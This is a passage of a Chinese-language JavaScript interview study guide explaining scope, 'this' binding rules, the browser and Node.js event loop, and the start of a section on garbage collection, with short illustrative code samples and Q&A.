采用词法作用域，作用域在函数定义时就确定了</li><li>与调用位置无关</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> a = <span class="hljs-string">&#x27;global&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> a = <span class="hljs-string">&#x27;local&#x27;</span>;<br>  <span class="hljs-title function_">foo</span>(); <span class="hljs-comment">// 输出 &quot;global&quot; 而不是 &quot;local&quot;</span><br>&#125;<br><br><span class="hljs-title function_">bar</span>();<br></code></pre></td></tr></table></figure><h2 id="this-指向"><a href="#this-指向" class="headerlink" title="this 指向"></a>this 指向</h2><p><strong>基本概念</strong></p><ul><li>this 是一个特殊的对象，指向当前执行上下文</li><li>this 的值取决于函数的调用方式</li></ul><p><strong>this 的绑定规则</strong></p><p>（1）默认绑定</p><ul><li>独立函数调用时，this 指向全局对象</li><li>严格模式下为 undefined</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// 浏览器中指向 window</span><br>&#125;<br><span class="hljs-title function_">foo</span>();<br></code></pre></td></tr></table></figure><p>（2）隐士绑定</p><ul><li>作为对象方法调用时，this 指向调用对象</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;<br>&#125;;<br><br>obj.<span class="hljs-title function_">sayName</span>(); <span class="hljs-comment">// &quot;Alice&quot; (this 指向 obj)</span><br></code></pre></td></tr></table></figure><p>（3）显示绑定</p><ul><li>使用 call、apply、bind 强制指定 this</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> person = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Bob&#x27;</span> &#125;;<br><br>greet.<span class="hljs-title function_">call</span>(person); <span class="hljs-comment">// &quot;Hello, Bob&quot;</span><br></code></pre></td></tr></table></figure><p>（4）new 绑定</p><ul><li>构造函数调用时，this 指向新创建的对象</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Charlie&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">name</span>); <span class="hljs-comment">// &quot;Charlie&quot;</span><br></code></pre></td></tr></table></figure><p>（5）箭头函数</p><ul><li>箭头函数没有自己的 this，继承外层作用域的 this</li><li>无法通过 call、apply、bind 改变</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Dave&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// 指向外层 this (可能是 window)</span><br>  &#125;<br>&#125;;<br><br>obj.<span class="hljs-title function_">sayName</span>(); <span class="hljs-comment">// 可能输出 undefined</span><br></code></pre></td></tr></table></figure><p><strong>this 的特殊情况</strong></p><p>（1）回调函数中的 this</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Eve&#x27;</span>,<br>  <span class="hljs-attr">delayedGreet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// this 指向 window/undefined</span><br>    &#125;, <span class="hljs-number">100</span>);<br>  &#125;<br>&#125;;<br><br>obj.<span class="hljs-title function_">delayedGreet</span>(); <span class="hljs-comment">// 输出空或 undefined</span><br></code></pre></td></tr></table></figure><p>解决方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用箭头函数</span><br><span class="hljs-attr">delayedGreet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// 继承外层 this</span><br>  &#125;, <span class="hljs-number">100</span>);<br>&#125;<br><br><span class="hljs-comment">// 或保存 this</span><br><span class="hljs-attr">delayedGreet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> self = <span class="hljs-variable language_">this</span>;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(self.<span class="hljs-property">name</span>);<br>  &#125;, <span class="hljs-number">100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）DOM 事件处理函数</p><ul><li>事件处理函数中的 this 指向触发事件的元素</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// 指向 button 元素</span><br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="三者的关系与区别"><a href="#三者的关系与区别" class="headerlink" title="三者的关系与区别"></a>三者的关系与区别</h2><table><thead><tr><th align="left">特性</th><th align="left">作用域</th><th align="left">作用域链</th><th align="left">this指向</th></tr></thead><tbody><tr><td align="left">定义</td><td align="left">变量的可访问范围</td><td align="left">变量查找的链式结构</td><td align="left">当前执行上下文对象</td></tr><tr><td align="left">确定时机</td><td align="left">代码编写时（词法作用域）</td><td align="left">函数定义时</td><td align="left">函数调用时</td></tr><tr><td align="left">影响因素</td><td align="left">变量声明位置</td><td align="left">函数嵌套层级</td><td align="left">调用方式</td></tr><tr><td align="left">修改方式</td><td align="left">无法动态修改</td><td align="left">无法动态修改</td><td align="left">call&#x2F;apply&#x2F;bind&#x2F;new</td></tr><tr><td align="left">箭头函数</td><td align="left">遵守块级作用域</td><td align="left">正常形成作用域链</td><td align="left">继承外层 this</td></tr></tbody></table><h2 id="面试常见问题-3"><a href="#面试常见问题-3" class="headerlink" title="面试常见问题"></a>面试常见问题</h2><p><strong>Q：vary、let、const 的作用域区别？</strong></p><ul><li>var：函数作用域，会变量提升</li><li>let&#x2F;const：块级作用域，有暂时性死区（TDZ）</li></ul><p><strong>Q：什么是闭包？它与作用域链有什么关系？</strong></p><p>闭包是可以访问自由变量的函数，它通过作用域链访问外层变量，即使外层函数已经执行完毕</p><p><strong>Q：箭头函数为什么不能用作构造函数？</strong></p><p>箭头函数没有自己的 this，也没有 prototype 属性</p><p><strong>Q：如何改变 this 指向？</strong></p><p>通过 call、apply、bind、new 或箭头函数等方式</p><p><strong>Q：以下代码的输出？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> name = <span class="hljs-string">&#x27;Global&#x27;</span>;<br><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Object&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;,<br>  <span class="hljs-attr">sayNameArrow</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;<br>&#125;;<br><br>obj.<span class="hljs-title function_">sayName</span>();       <span class="hljs-comment">// ?</span><br>obj.<span class="hljs-title function_">sayNameArrow</span>();  <span class="hljs-comment">// ?</span><br><span class="hljs-keyword">const</span> fn = obj.<span class="hljs-property">sayName</span>;<br><span class="hljs-title function_">fn</span>();                <span class="hljs-comment">// ?</span><br></code></pre></td></tr></table></figure><p>答案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-string">&quot;Object&quot;</span>  (隐式绑定)<br><span class="hljs-string">&quot;Global&quot;</span>  (箭头函数继承全局 <span class="hljs-variable language_">this</span>)<br><span class="hljs-string">&quot;Global&quot;</span>  (默认绑定)<br></code></pre></td></tr></table></figure><p><strong>Q：全局作用域中的变量会形成闭包引用吗？</strong></p><p>严格来说，全局变量不会形成真正的闭包引用。闭包是指函数能够访问并保持对其词法作用域（通常是外部函数作用域）变量的引用，而全局变量本身就存在于全局作用域中，任何函数都可以直接访问，不需要特殊的闭包机制来保持这些变量的存在</p><p><strong>Q：全局作用域内使用 let 声明的变量，算块级作用域还是全局作用域？</strong></p><p>全局作用域内使用 let 声明的变量具有双重特性：从作用范围来看它是全局的，因为在任何地方都可以访问；从绑定行为上来看它保持了块级作用域的特性，包括暂时性死区、不会成为全局对象（比如 window）的属性。这种设计既保证了变量的全局可用性，又避免了传统 var 声明变量带来的全局污染问题</p><h1 id="事件循环和消息队列"><a href="#事件循环和消息队列" class="headerlink" title="事件循环和消息队列"></a>事件循环和消息队列</h1><h2 id="事件循环的本质与必要性"><a href="#事件循环的本质与必要性" class="headerlink" title="事件循环的本质与必要性"></a>事件循环的本质与必要性</h2><p><strong>为什么需要事件循环？</strong></p><p>JavaScript 采用单线程模型设计，主要基于以下几点考虑：</p><ul><li>DOM 操作的一致性：多线程同时操作 DOM 会带来不可预期的结果</li><li>简化编程模型：避免了多线程编程中的复杂性，比如死锁、资源竞争等</li><li>适合 web 应用场景：web 应用主要是 I&#x2F;O 密集型而非计算密集型</li></ul><p>而采用单线程模型设计，就意味着所有任务必须排队等待执行，如果前一个任务执行时间过长，就会阻塞后续任务。事件循环机制解决了这个问题，使得JavaScript 能够实现非阻塞的异步操作</p><p><strong>事件循环的定义</strong><br>事件循环是 JavaScript 运行时对任务调度的实现方式，它协调同步代码执行、异步回调处理、UI 渲染等操作。本质上，事件循环是一个不断检查任务队列并执行任务的循环过程</p><h2 id="事件循环的核心组成"><a href="#事件循环的核心组成" class="headerlink" title="事件循环的核心组成"></a>事件循环的核心组成</h2><p><strong>调用栈（Call Stack）</strong></p><p>调用栈是存储函数调用的栈结构，遵循“后进先出”原则。当函数被调用时会被压入栈顶，执行完毕后从栈顶弹出</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;foo&#x27;</span>);<br>  <span class="hljs-title function_">bar</span>();<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;bar&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_">foo</span>();<br></code></pre></td></tr></table></figure><p>上述代码的调用栈变化：</p><ol><li>foo()入栈</li><li>console.log(‘foo’)入栈并执行，然后出栈</li><li>bar()入栈</li><li>console.log(‘bar’)入栈并执行，然后出栈</li><li>bar()出栈</li><li>foo()出栈</li></ol><p><strong>任务队列（Task Queue）</strong></p><p>任务队列是一种先进先出（FIFO）的数据结构，用于存储待执行的异步任务回调，当 JavaScript 主线程执行完当前调用栈中的任务后，会从任务队列中取出下一个任务执行。任务队列分为三类：</p><p>（1）宏任务队列（MacroTask Queue）</p><ul><li>script（整体代码）</li><li>setTimeout&#x2F;setInterval</li><li>I&#x2F;O 操作</li><li>UI 渲染</li><li>MessageChannel</li><li>setImmediate（Node.js）</li></ul><p>每次事件循环只执行一个宏任务</p><p>（2）微任务队列（MicroTask Queue）</p><ul><li>Promise.then&#x2F;catch&#x2F;finally</li><li>MutationObeserver</li><li>queueMicrotask</li><li>process.nextTick（Node.js，优先级最高）</li></ul><p>每次事件循环会清空整个微任务队列</p><p>（3）其他特殊队列</p><ul><li>requestAnimationFrame（浏览器）</li><li>requestIdleCallback（浏览器）</li><li>I&#x2F;O 回调队列：Node.js 特有的 I&#x2F;O 相关回调</li></ul><p><strong>Web APIs</strong></p><p>浏览器提供的异步 API，如 DOM 点击事件、Ajax、setTimeout 等，这些 API 由浏览器的其他线程处理，完成后将回调放入任务队列</p><h2 id="事件循环的详细工作流程"><a href="#事件循环的详细工作流程" class="headerlink" title="事件循环的详细工作流程"></a>事件循环的详细工作流程</h2><p><strong>完整执行顺序</strong></p><ol><li>执行同步代码：从 script（整体代码）开始，依次执行所有同步任务</li><li>检查微任务队列：执行栈为空后，依次执行所有微任务，如果微任务执行过程中又产生了新的微任务，会继续执行新产生的微任务，直到微任务队列清空</li><li>UI 渲染（浏览器环境）：更新界面</li><li>执行一个宏任务：从宏任务队列中取出最早的一个任务执行</li><li>重复步骤 2～4，形成循环</li></ol><p><strong>关键特性</strong></p><ul><li>微任务的优先级高于宏任务：每执行完一个宏任务后，会清空微任务队列</li><li>微任务插队机制：微任务可以插入当前执行栈栈尾</li><li>任务嵌套的处理：微任务执行过程中产生的新的微任务会在当前周期内继续执行，宏任务中产生的任务会在进入队列等待下一轮执行</li><li>渲染时机：浏览器通常会在宏任务之间执行渲染</li></ul><p><strong>代码示例分析</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;script start&#x27;</span>);<br><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;setTimeout&#x27;</span>);<br>  <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;promise in setTimeout&#x27;</span>);<br>  &#125;);<br>&#125;, <span class="hljs-number">0</span>);<br><br><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;promise1&#x27;</span>);<br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;promise2&#x27;</span>);<br>&#125;);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;script end&#x27;</span>);<br><br><span class="hljs-comment">/* 输出顺序：</span><br><span class="hljs-comment">script start</span><br><span class="hljs-comment">script end</span><br><span class="hljs-comment">promise1</span><br><span class="hljs-comment">promise2</span><br><span class="hljs-comment">setTimeout</span><br><span class="hljs-comment">promise in setTimeout</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>执行过程分析：</p><ol><li><p>同步代码执行：打印 “script start“ 和 “script end“</p></li><li><p>setTimeout 回调进入宏任务队列</p></li><li><p>Promise.then 回调进入微任务队列</p></li><li><p>同步代码执行完毕，执行微任务队列：</p><ul><li>打印 “promise1“，第二个 then 进入微任务队列</li><li>打印 “promise2“</li></ul></li><li><p>执行宏任务队列中的 setTimeout 回调：</p><ul><li>打印 “setTimeout“</li><li>Promise.then 回调进入微任务队列</li></ul></li><li><p>再次检查微任务队列，打印“promise in setTimeout”</p></li></ol><h2 id="浏览器与Node-js事件循环差异"><a href="#浏览器与Node-js事件循环差异" class="headerlink" title="浏览器与Node.js事件循环差异"></a>浏览器与Node.js事件循环差异</h2><p><strong>浏览器事件循环特点</strong></p><ol><li>阶段简单：主要分为宏任务执行、微任务执行、UI 渲染三个阶段</li><li>任务类型：宏任务和微任务</li><li>渲染时机：在宏任务之间可能进行 UI 渲染</li></ol><p><strong>Node.js 事件循环特点</strong><br>Node.js 使用 libuv 库实现事件循环，分为六个阶段：</p><ol><li>timers：执行 setTimeout 和 setInterval 回调</li><li>pending callbacks：执行系统操作（如 TCP 错误）的回调</li><li>idle，prepare：仅 Node 内部使用</li><li>poll：检索新的 I&#x2F;O 事件；执行与 I&#x2F;O 相关的回调（除了 close、timers 和 setImmediate）；可能会阻塞等待新事件</li><li>check：执行 setImmediate 回调</li><li>close callback：执行关闭事件的回调（如 socket.on(‘close’)）</li></ol><p><strong>关键区别对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">浏览器</th><th align="left">Node.js</th></tr></thead><tbody><tr><td align="left">实现基础</td><td align="left">浏览器引擎</td><td align="left">libuv 库</td></tr><tr><td align="left">阶段划分</td><td align="left">宏任务、微任务、UI 渲染</td><td align="left">6 个明确阶段</td></tr><tr><td align="left">setImmediate</td><td align="left">仅 IE 支持</td><td align="left">标准 API</td></tr><tr><td align="left">process.nextTick</td><td align="left">不支持</td><td align="left">最高优先级微任务</td></tr><tr><td align="left">I&#x2F;O 处理</td><td align="left">Web APIs</td><td align="left">libuv 线程池</td></tr><tr><td align="left">任务优先级</td><td align="left">微任务优先</td><td align="left">nextTick &gt; 微任务</td></tr></tbody></table><p><strong>Node.js 特殊行为</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// timeout_vs_immediate.js</span><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;timeout&#x27;</span>);<br>&#125;, <span class="hljs-number">0</span>);<br><br><span class="hljs-title function_">setImmediate</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;immediate&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>在 Node.js 中，上述代码的输出顺序是不确定的，因为受进程性能影响。但在 I&#x2F;O 周期内调用时，setImmediate 总是优先于 setTimeout</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br>fs.<span class="hljs-title function_">readFile</span>(__filename, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;timeout&#x27;</span>);<br>  &#125;, <span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-title function_">setImmediate</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;immediate&#x27;</span>);<br>  &#125;);<br>&#125;);<br><span class="hljs-comment">// 总是输出: immediate -&gt; timeout</span><br></code></pre></td></tr></table></figure><h2 id="高级应用场景"><a href="#高级应用场景" class="headerlink" title="高级应用场景"></a>高级应用场景</h2><p><strong>Vue.nextTick 实现原理</strong></p><p>Vue 通过微任务队列实现异步 DOM 更新。在浏览器环境中，Vue 会优先使用Promise.then，降级方案包括 mutationObeserver 和 setTimeout</p><p><strong>async&#x2F;await 的执行时机</strong></p><p>async 函数返回 promise，await 实际上会暂停函数执行，将后续代码作为微任务</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">bar</span>();<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">3</span>); <span class="hljs-comment">// 相当于Promise.then</span><br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">2</span>);<br>&#125;<br><br><span class="hljs-title function_">foo</span>();<br><span class="hljs-comment">// 输出: 1, 2, 3</span><br></code></pre></td></tr></table></figure><p><strong>利用 MessageChannel 实现高优先级异步</strong></p><p>MessageChannel 的回调作为宏任务，但优先级高于 setTimeout</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> channel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageChannel</span>();<br>channel.<span class="hljs-property">port1</span>.<span class="hljs-property">onmessage</span> = <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;MessageChannel callback&#x27;</span>);<br>&#125;;<br>channel.<span class="hljs-property">port2</span>.<span class="hljs-title function_">postMessage</span>(<span class="hljs-literal">null</span>);<br><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;setTimeout&#x27;</span>);<br>&#125;, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 输出顺序: MessageChannel callback -&gt; setTimeout</span><br></code></pre></td></tr></table></figure><h2 id="面试常见问题-4"><a href="#面试常见问题-4" class="headerlink" title="面试常见问题"></a>面试常见问题</h2><p><strong>Q：setTimeout(fn, 0)是立即执行吗？</strong></p><p>不是，它表示”尽快执行“，但要等到：</p><ol><li>当前同步代码执行完</li><li>所有微任务执行完</li><li>可能还要等待 UI 渲染</li></ol><p><strong>Q：为什么 promise 是微任务？</strong></p><p>为了确保异步回调的高优先级执行，避免被其他宏任务延迟</p><p><strong>Q：如何理解 “JavaScript 是单线程“？</strong></p><p>JavaScript 只有一个主线程执行调用栈中的代码，但浏览器是多线程的（如网络请求、定时器等由其他线程处理）</p><h1 id="JavaScript-垃圾回收机制"><a href="#JavaScript-垃圾回收机制" class="headerlink" title="JavaScript 垃圾回收机制"></a>JavaScript 垃圾回收机制</h1><h2 id="内存管理基础"><a href="#内存管理基础" class="headerlink" title="内存管理基础"></a>内存管理基础</h2><h3 id="内存生命周期"><a href="#内存生命周期" class="headerlink" title="内存生命周期"></a>内存生命周期</h3><p>JavaScript 内存管理遵循以下生命周期：</p><ul><li>分配分配：当创建变量、函数或对象时自动分配</li><li>使用内存：对内存进行读写操作</li><li>释放内存：当内存不再被需要时，通过垃圾回收机制自动释放</li></ul><h3 id="内存分配机制"><a href="#内存分配机制" class="headerlink" title="内存分配机制"></a>内存分配机制</h3><p>JavaScript 引擎（V8）在变量声明时自动分配内存，主要分为两类存储区域：</p><p><strong>栈内存（Stack）</strong></p><p>栈内存负责存储基本类型（<code>null</code>、<code>undefined</code>、<code>Symbol</code>、<code>Number</code>、<code>String</code>、<code>Boolean</code>、<code>BigInt</code>）和对象的引用地址，其特点是：</p><ul><li>空间固定（通常 